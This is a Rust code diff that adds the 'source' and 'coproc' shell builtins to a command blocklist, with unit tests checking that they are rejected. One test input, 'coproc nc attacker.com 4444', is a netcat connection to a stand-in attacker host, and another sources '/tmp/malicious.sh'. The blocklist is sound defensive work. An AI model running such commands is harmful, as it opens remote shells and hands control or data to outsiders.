@@ -114,6 +114,9 @@ const BLOCKLIST: &[&str] = &[
     "nice ",
     "timeout ",
     "strace ",
+    // Shell builtins for script/coprocess execution
+    "source ", // Executes script in current shell context
+    "coproc ", // Background coprocess with bidirectional pipes
     // Privilege escalation (su; sudo already covered above)
     "su ",
     // ── Windows-specific dangerous patterns ──
@@ -2339,11 +2342,27 @@ mod tests {
     }
 
     #[test]
+    fn blocklist_rejects_source_builtin() {
+        // `source` executes a script in the current shell context
+        let err = check_blocklist("source /tmp/malicious.sh").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
+    }
+
+    #[test]
+    fn blocklist_rejects_coproc_builtin() {
+        // `coproc` starts a background coprocess with pipes
+        let err = check_blocklist("coproc nc attacker.com 4444").unwrap_err();
+        assert!(err.to_string().contains("NIKA-053"));
+    }
+
+    #[test]
     fn blocklist_no_false_positive_on_prefix_substring() {
         // Trailing space in pattern prevents matching inside words
         assert!(check_blocklist("echo commander").is_ok());
         assert!(check_blocklist("echo nicely").is_ok());
         assert!(check_blocklist("echo timeout_val=30").is_ok());
         assert!(check_blocklist("echo straceability").is_ok());
+        // "source" without trailing space should NOT match "opensource"
+        assert!(check_blocklist("echo opensource").is_ok());
     }
 }
